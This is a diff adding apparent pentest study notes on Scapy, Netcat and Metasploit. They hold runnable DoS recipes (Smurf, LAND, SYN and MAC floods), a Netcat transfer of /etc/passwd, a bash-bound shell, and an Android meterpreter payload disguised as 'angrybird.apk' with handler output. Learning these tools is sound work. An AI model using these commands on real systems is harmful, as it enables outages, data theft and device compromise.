@@ -1,0 +1,370 @@
+Network Operation/Packet crafting using SCAPY:
+----------------------------------------------
++ Scapy is a powerful interactive packet manipulation program.
+
++ Install it:
+
+# apt install python3-scapy -y
+
++ Interactive Shell:
+
+# scapy
+
+ICMP [ping]
+````````````
+
+>>> x = IP()/ICMP()
+>>> x.show()
+
+OR
+
+>>> a = IP()
+>>> b = ICMP()
+>>> a.src = "192.168.91.130"
+>>> a.dst = "196.1.113.45"
+
+>>> send(a/b)
+>>> send(a/b/"LOL")
+
++ CHECK IN WIRESHARK
+
+Send TCP Packets:
+-----------------
+# scapy
+
+>>> a = IP()
+>>> a.src = "127.0.0.1"
+>>> a.dst = "196.1.113.45"
+
+>>> b = TCP()
+>>> b.sport = 53
+>>> b.dport = 80
+
+>>> send(a/b, count=10)
+__________________________________________________________________
+Attacks that can be perform by scapy :
+--------------------------------------
+
+1. Smurf Attack - very old attack & its closed:
+-----------------------------------------------
+It involves an attacker send ICMP req(ping) to network's broadcast Address (x.x.x.255). the attacker spoofs the source of ICMP req to be the IP address of intended victim.
+
+Reason: ICMP does not imcludes HandShake, the destination has no way of verfying the source IP.
+
+# scapy
+
+>>> a = IP()/ICMP()
+>>> a.src = "victim'sIP"
+>>> a.dst = "192.168.91.255"
+
+>>> send(a,loop=1)
+
+2. LAND Attack:
+--------------- DOS (Denial of service)
+
+Attack in whoch a packet is sent to a target machine with the same address. ( src & dst are the same. )
+
+# scapy
+
+>>> a = IP()
+>>> a.src = "target'IP"
+>>> a.dst = "target'IP"
+
+>>> b = TCP()
+>>> b.sport = 80
+>>> b.dport = 22
+
+>>> send(a/b, loop=1)
+
+3. SYN Flood Attack:
+--------------------
+
+SYN Flood is also known as half-open attack. In this attack, the attacker send multiple connection req to perform the attack.
+
+>> a = IP()
+>>> b = TCP()
+>>> a.src = "127.0.0.1"
+>>> a.dst = "127.0.0.1"
+
+>>> b.flags = "S"
+>>> 
+>>> b.sport = 53
+>>> b.dport = 80
+>>> send(a/b, loop=1)
+
+4. MAC Flood:
+-------------
+# scapy
+
+>>> a = Ether()
+>>> a.show()
+
+>>> b = ARP()
+>>> b.show()
+
+>>> b.pdst = '192.168.91.255' 
+>>> b.hwdst = "ff:ff:ff:ff:ff:ff"
+
+
+>>> send(a/b, iface="eth0")
+
+____
+# cat mac_flood.py 
+#!/usr/bin/python3
+from scapy.all import *
+
+num = int(input("Enter the number of packets: "))
+interface = input("Enter the interface: ")
+
+a = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
+
+b = ARP(pdst='192.168.91.255', hwdst="ff:ff:ff:ff:ff:ff")
+
+
+try:
+    send(a/b, iface=interface, count=num)
+except:
+    print("Destination unreachable")
+
+________________
+Extra: SNIFF:
+>>> a = sniff()
+crtl+c [ Stop sniffing ]
+
+>>> a.summary()
+-------------
+Netcat:
+-------
+1) To start listening on a port:
+--------------------------------
+
+Machine:1 [192.168.91.130]
+
+# nc -lp 8080 -vvv
+
+Machine:2
+
+# nc 192.168.91.130 8080 -v
+
+2) To trasfer the data:
+-----------------------
+Machine:1
+
+# nc -lp 8080 -v > data.txt
+
+Machine:2
+
+# nc 192.168.91.130 8080 -vv < /etc/passwd
+
+
+3) To perform port scanning:
+----------------------------
+
+# nc -z 192.168.91.130 22 -v
+# nc -z -v 192.168.91.132 22 80
+# nc -z -v 192.168.91.132 22-80
+
+4) HTTP Req:
+------------
+# nc demo2server.in 80 -v
+
+GET /robots.txt HTTP/1.1
+Host: demo2server.in
+
+5) Launching the reverse shell:
+-------------------------------
+
+Machine:1 [target]
+
+# nc -n -lvp 9999 -e /bin/bash
+
+Machine:2
+
+# nc 192.168.91.130 9999 -v
+pwd
+id
+
+6) Connect to UDP:
+------------------
+# nc -u -lvp 53
+
+7) Keep-Alive:
+--------------
+# nc -k -lvp 8080
+________________________________________________________
+Metasploit Framework:
+---------------------
+
+Language 	: ruby on rails
+Database 	: postgresql
+Org		: rapid7
+
+
+GUI	:	armitage
+CLI	:	msfconsole
+Web	:	http://x.x.x.x:xxxx
+
+1) Setup Postgresql:
+--------------------
+# systemctl start postgresql
+# systemctl status postgresql
+
+2) Init msf db:
+---------------
+# msfdb init
+
+# msfdb reinit
+
+3) start msf:
+-------------
+# msfconsole
+
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
++ auxiliary 		[ Recon/Scan ]
++ exploits		[ Break into security ]
++ payloads		[ malicious code ]
++ post			[ post payloads ]
++ encoders		[ encode ]
++ evasion			[ bypass anti-virus ]
++ nops			[ no-operations ]
+
+Platforms:
+-----------
+
+Reverse Shell:
+--------------
+- reverse_shell [ console ]
+- meterpreter	[ pre-defined scripts + shell ]
+
+Reverse connection:
+-------------------
+- reverse_tcp
+- reverse_http
+- reverse_https
+
+
+
+a) Android
+```````````
+
+[+] Create Payload:
+```````````````````
+msf6 > use payload/android/meterpreter/reverse_tcp
+msf6 payload(android/meterpreter/reverse_tcp) > show options
+Module options (payload/android/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be speci
+                                     fied)
+   LPORT  4444             yes       The listen port
+
+msf6 payload(android/meterpreter/reverse_tcp) > set LHOST attacker'IP
+LHOST => 192.168.29.81
+msf6 payload(android/meterpreter/reverse_tcp) > set LPORT 9090
+LPORT => 9090
+msf6 payload(android/meterpreter/reverse_tcp) > generate -f raw -o /var/www/html/angrybird.apk
+msf6 payload(android/meterpreter/reverse_tcp) > back
+
+[+]Start reverse handler:
+`````````````````````````
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.29.81
+msf6 exploit(multi/handler) > set LPORT 9090
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 192.168.29.81:9090
+[*] Sending stage (77138 bytes) to 192.168.29.90
+[*] Meterpreter session 1 opened (192.168.29.81:9090 -> 192.168.29.90:54512 ) at 2022-02-09 05:51:02 -0500
+
+meterpreter > ?
+____________
+
+Automate:
+---------
+
+
+
+
+
+
+
+
+____________
+
+b) Linux/Unix
+``````````````
+# msfconsole
+
+
+
+
+c) Web Servers
+d) Windows
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
